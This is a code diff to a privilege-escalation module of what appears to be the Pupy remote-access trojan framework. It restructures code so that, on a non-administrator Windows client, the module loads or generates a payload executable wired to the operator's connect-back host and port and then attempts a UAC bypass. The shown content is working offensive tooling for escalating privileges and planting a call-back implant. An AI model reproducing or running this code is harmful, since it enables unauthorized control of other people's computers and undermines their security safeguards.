@@ -32,28 +32,29 @@ class GetPrivsModule(PupyModule):
 				f.write(bypassuac.read())
 				f.close()
 
-		exebuff=b""
-		if args.pupy:
-			with open(args.pupy,'rb') as f:
-				exebuff=f.read()
-			self.info("loading %s ..."%args.pupy)
-		else:
-			#retrieving conn info
-			res=self.client.conn.modules['pupy'].get_connect_back_host()
-			host, port=res.rsplit(':',1)
-			#generating exe
-			self.info("generating exe ...")
-			if self.client.desc['proc_arch']=="64bit":
-				exebuff=pupygen.get_edit_pupyx64_exe(host, port, self.client.pupsrv.transport)
-			else:
-				exebuff=pupygen.get_edit_pupyx86_exe(host, port, self.client.pupsrv.transport)
-
-		self.client.load_package("pupwinutils.security", force=True)
-
 		AdminCheck=self.client.conn.modules["pupwinutils.security"].AdminCheck()
 
 		if AdminCheck==False:
 			self.info("Not ADMIN, attempting to bypassUAC")
+				
+			exebuff=b""
+			if args.pupy:
+				with open(args.pupy,'rb') as f:
+					exebuff=f.read()
+				self.info("loading %s ..."%args.pupy)
+			else:
+				#retrieving conn info
+				res=self.client.conn.modules['pupy'].get_connect_back_host()
+				host, port=res.rsplit(':',1)
+				#generating exe
+				self.info("generating exe ...")
+				if self.client.desc['proc_arch']=="64bit":
+					exebuff=pupygen.get_edit_pupyx64_exe(host, port, self.client.pupsrv.transport)
+				else:
+					exebuff=pupygen.get_edit_pupyx86_exe(host, port, self.client.pupsrv.transport)
+	
+			self.client.load_package("pupwinutils.security", force=True)
+
 			try:
 				#if args.method=="binary":
 				if self.client.desc['proc_arch']=="64bit":
